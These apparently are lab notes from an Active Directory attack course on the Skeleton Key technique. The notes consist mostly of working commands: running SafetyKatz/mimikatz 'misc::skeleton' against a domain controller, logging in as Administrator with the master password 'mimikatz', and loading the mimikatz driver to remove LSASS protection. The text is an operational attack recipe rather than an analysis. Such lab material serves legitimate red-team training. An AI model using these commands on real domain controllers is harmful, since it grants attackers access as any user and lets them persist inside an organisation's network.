# Skeleton Key 

Tags: #AD #Windows #Powershell #SafetyKatz 

```bash 
- Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
- All the publicly known methods are NOT persistent across reboots.
- Yet again, mimikatz to the rescue.
```

```powershell 
# Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
❯ SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local


# Now, it is possible to access any machine with a valid username and password as "mimikatz"
❯ Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
```

```bash 
In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:

	mimikatz # privilege::debug
	mimikatz # !+
	mimikatz # !processprotect /process:lsass.exe /remove
	mimikatz # misc::skeleton
	mimikatz # !-

Notes:
	1. Note that above would be very noisy in logs - Service installation (Kernel mode driver)
```